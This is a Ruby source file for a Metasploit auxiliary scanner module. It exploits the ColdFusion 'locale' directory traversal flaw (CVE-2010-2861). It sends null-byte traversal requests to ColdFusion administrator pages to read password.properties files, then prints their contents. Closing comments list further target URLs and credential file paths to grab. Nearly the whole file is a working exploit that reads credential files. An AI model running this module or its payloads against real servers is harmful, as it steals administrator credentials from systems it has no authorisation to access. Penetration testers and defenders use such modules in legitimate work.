##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'ColdFusion Server Check',
			'Description' => %q{
					This module attempts to exploit the directory traversal in the 'locale'
				attribute.  According to the advisory the following versions are vulnerable:

				ColdFusion MX6 6.1 base patches,
				ColdFusion MX7 7,0,0,91690 base patches,
				ColdFusion MX8 8,0,1,195765 base patches,
				ColdFusion MX8 8,0,1,195765 with Hotfix4.

				Adobe released patches for ColdFusion 8.0, 8.0.1, and 9 but ColdFusion 9 is reported
				to have directory traversal protections in place, subsequently this module does NOT
				work against ColdFusion 9.  Adobe did not release patches for ColdFusion 6.1 or
				ColdFusion 7.
			},
			'Author'      => [ 'CG' ],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2010-2861' ],
					[ 'BID', '42342' ],
					[ 'OSVDB', '67047' ],
					[ 'URL', 'http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07' ],
					[ 'URL', 'http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-18.html' ],
				]
		)

		register_options(
			[
				OptString.new('URL', [ true,  "URI Path", '/CFIDE/administrator/enter.cfm']),
				OptString.new('PATH', [ true,  "traversal and file", '../../../../../../../../../../ColdFusion8/lib/password.properties%00en']),
			], self.class)
	end

	def run_host(ip)

		url = datastore['URL']
		locale = "?locale="
		trav = datastore['PATH']

		res = send_request_raw({
			'uri'     => url+locale+trav,
			'method'  => 'GET',
			'headers' =>
				{
					'Connection' => "keep-alive",
					'Accept-Encoding' => "zip,deflate",
				},
			}, -1)

		if (res.nil?)
			print_error("no response for #{ip}:#{rport} #{url}")
		elsif (res.code == 200)
			#print_error("#{res.body}")#debug
			print_status("URL: #{ip}#{url}")
			if match = res.body.match(/\<title\>(.*)\<\/title\>/im);
				fileout = $1
				print_status("FILE OUTPUT:\n" + fileout + "\r\n")
			else
				''
			end
		else
			''
		end

	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
	rescue ::Timeout::Error, ::Errno::EPIPE
	end

end

#URL's that may work for you:
#"/CFIDE/administrator/enter.cfm",
#"/CFIDE/wizards/common/_logintowizard.cfm",
#"/CFIDE/administrator/archives/index.cfm",
#"/CFIDE/install.cfm",
#"/CFIDE/administrator/entman/index.cfm",
#"/CFIDE/administrator/logging/settings.cfm",

#Files to grab
#../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#../../../../../../../../../../CFusionMX7/lib/password.properties%00en
#../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
